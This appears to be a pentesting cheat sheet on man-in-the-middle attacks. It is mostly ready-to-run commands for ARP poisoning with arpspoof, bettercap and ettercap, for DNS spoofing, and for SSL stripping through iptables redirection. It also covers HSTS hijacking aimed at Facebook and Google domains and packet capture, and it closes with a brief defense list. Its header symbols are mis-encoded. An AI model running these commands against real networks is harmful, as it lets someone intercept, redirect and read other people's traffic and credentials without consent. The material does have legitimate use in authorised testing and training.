# üïµÔ∏è MITM (Man-in-the-Middle) Attacks

---

## üîÑ ARP Spoofing

### arpspoof
```bash
# Enable IP forwarding
echo 1 > /proc/sys/net/ipv4/ip_forward

# ARP spoof
arpspoof -i eth0 -t 192.168.1.10 192.168.1.1  # Target -> Gateway
arpspoof -i eth0 -t 192.168.1.1 192.168.1.10  # Gateway -> Target
```

### Bettercap
```bash
# Start bettercap
bettercap -iface eth0

# ARP spoofing
> net.probe on
> net.sniff on
> set arp.spoof.targets 192.168.1.10
> arp.spoof on
```

### Ettercap
```bash
# GUI mode
ettercap -G

# CLI - ARP poisoning
ettercap -T -M arp:remote /192.168.1.1// /192.168.1.10//
```

---

## üåê DNS Spoofing

### Bettercap
```bash
> set dns.spoof.domains example.com
> set dns.spoof.address 192.168.1.100
> dns.spoof on
```

### dnsspoof
```bash
# Create hosts file
echo "192.168.1.100 example.com" > hosts.txt

# Spoof
dnsspoof -i eth0 -f hosts.txt
```

---

## üîì SSL Strip

### sslstrip
```bash
# Setup iptables
iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port 8080

# Run sslstrip
sslstrip -l 8080
```

### Bettercap (hstshijack)
```bash
> set hstshijack.targets *.facebook.com, *.google.com
> hstshijack on
```

---

## üì° Traffic Capture

```bash
# Wireshark
wireshark -i eth0

# tcpdump
tcpdump -i eth0 -w capture.pcap

# Bettercap
> net.sniff on
> set net.sniff.output capture.pcap
```

---

## üõ°Ô∏è MITM Tools Summary

| Tool | Purpose |
|------|---------|
| **Bettercap** | All-in-one MITM framework |
| **Ettercap** | Classic MITM tool |
| **arpspoof** | ARP poisoning |
| **sslstrip** | HTTPS downgrade |
| **Responder** | LLMNR/NBT-NS poisoning |
| **mitmproxy** | HTTP/HTTPS proxy |

---

## ‚ö†Ô∏è Defense

```
- Enable Dynamic ARP Inspection (DAI)
- Use HTTPS everywhere (HSTS)
- Enable 802.1X authentication
- Monitor for ARP anomalies
```

---

**Back to Network:** [üåê Network Pentesting](./README.md)
